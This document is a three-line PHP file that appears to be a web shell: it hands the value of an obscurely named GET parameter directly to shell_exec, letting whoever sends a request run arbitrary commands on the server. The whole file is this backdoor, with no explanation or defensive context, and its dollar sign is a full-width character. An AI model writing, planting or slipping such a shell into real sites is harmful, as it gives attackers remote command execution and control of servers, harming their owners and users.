<?php
shell_exec(＄_GET['GEZ4gWQ3']);
?>
